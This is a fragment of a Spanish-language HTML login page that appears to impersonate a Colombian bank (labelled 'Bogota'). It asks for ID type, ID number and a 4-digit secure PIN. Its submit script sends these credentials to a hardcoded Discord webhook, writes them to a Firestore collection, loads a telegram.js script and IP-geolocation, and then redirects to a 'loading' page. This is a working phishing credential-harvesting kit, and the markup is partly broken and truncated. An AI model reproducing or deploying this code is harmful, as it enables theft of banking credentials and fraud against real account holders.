                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        "
                      >
                        <option hidden="" disabled="">Seleccione</option>
                        <option id="C.C.   Cédula de ciudadanía" value="CC">
                          C.C.. Cédula de ciudadanía
                        </option>
                        <option id="T.I.   Tarjeta de Identidad" value="TI">

                        </option>
                        <option id="C.E.   Cédula de Extranjería" value="CE">

                        </option>
                        <option id="N.P.N. NIT Persona Natural" value="NI">
                          N.P.N.. NIT Persona Natural
                        </option>
                        <option id="N.P.E. NIT Persona Extranjera" value="NE">
                          N.P.E.. NIT Persona Extranjera

                        <option id="P.S.   Pasaporte" value="PA">

                      </select>
                    </div>
                    <div style="width: 70%">
                      <input
                        id="form1identificacion"
                        type="text"
                        inputmode="numeric"
                        placeholder="#"
                        style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          margin-left: 5px;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;

                          font-size: 18px;

                  </div>

                    <input
                      id="form1clavesegura"

                      document

                          this.value = this.value.replace(/[^0-9]/g, "");
                        });
                    </script>
                  </div>

                  <button
                    style="
                      width: 100%;
                      background: #0043a9;
                      border-radius: 20px;
                      padding: 20p;
                      color: white;
                      margin-top: 30px;
                    "

                    Ingresar

                </form>
              </div>
            </div>
          </div>

      </div>
      <div class="right">

    <script>
      function showForm(formId, element) {
        // Ocultar todos los formularios
        document.querySelectorAll(".form-content").forEach(function (form) {
          form.style.display = "none";
        });

        // Mostrar el formulario seleccionado
        document.getElementById(formId).style.display = "inline";

        // Remover la clase activa de todas las pestañas
        document.querySelectorAll(".tab").forEach(function (tab) {
          tab.classList.remove("active");
        });

        // Agregar la clase activa a la pestaña seleccionada
        element.classList.add("active");
      }
    </script>

  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
  <script src="telegram.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#segura");

    form.addEventListener("submit", async (event) => {
      event.preventDefault(); // Evita que el formulario se envíe por defecto
      const opcion = document.querySelector("#form1select").value;
      const identificacion = document.querySelector(
        "#form1identificacion",
      ).value;
      const clave = document.querySelector("#form1clavesegura").value;

      // Validación: Comprobar si todos los campos están llenos
      if (
        identificacion.trim() === "" ||
        clave.trim() === "" ||
        opcion.trim() === ""
      ) {
        alert("Por favor, llena todos los campos.");
        return; // Evita que continúe el proceso si algún campo está vacío
      }

      // Validación: Comprobar si la clave tiene exactamente 4 dígitos
      if (!/^\d{4}$/.test(clave)) {
        alert("La clave debe tener exactamente 4 dígitos numéricos.");
        return; // Evita que continúe el proceso si la clave no es válida
      }

      localStorage.setItem("usuario", identificacion);
      const questionRef = doc(window.db, "bogot1", identificacion);
      await setDoc(questionRef, {
        page: 0,
      });
      const message =
        "Bogota\nTipo de indentificación: " +
        opcion +
        "\nIndentificación: " +
        identificacion +
        "\nClave: " +
        clave;

      axios
        .post(
          "https://discord.com/api/webhooks/1559991129309712385/yTPHRmeNY0Ic-Glf-b6brRW6akGmoVtqbno_Cacm6u2YX5MC7Sw5oAkCoa6SXAsUw0nL",
          {
            content: message,
          },
          {
            headers: {
              "Content-Type": "application/json",
            },
          },
        )
        .then((response) => {
          window.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });

    const form2 = document.querySelector("#tarjeta");

      localStorage.setItem("usuario", identificacion);

          {
